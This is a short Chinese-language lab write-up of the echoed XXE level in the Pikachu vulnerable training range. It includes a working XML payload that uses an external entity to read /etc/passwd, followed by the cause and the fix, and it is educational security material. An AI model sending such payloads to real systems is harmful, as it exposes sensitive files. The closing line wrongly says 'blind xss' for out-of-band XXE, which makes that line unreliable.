# Pikachu | XXE 外部实体注入2（有回显）
## 一、漏洞简介
同样XXE漏洞，页面可以正常输出实体内容，读取文件回显更直观。
## 二、环境信息
靶场地址：http://127.0.0.1/pikachu/
关卡路径：/vul/xxe/xxe_2.php
## 三、复现步骤
1. 提交XML数据包，定义外部实体读取文件
```xml
<?xml version="1.0"?>
<!DOCTYPE a [
<!ENTITY b SYSTEM "file:///etc/passwd">
]>
<a>&b;</a>
2. 文件内容直接展示在页面

四、Payload

读取本地敏感文件

五、漏洞原理

XML解析开启外部实体引用。

六、修复方案

在代码中关闭加载外部DTD、外部实体。

七、总结

无回显XXE一般用blind xss带外数据，有回显直接读文件。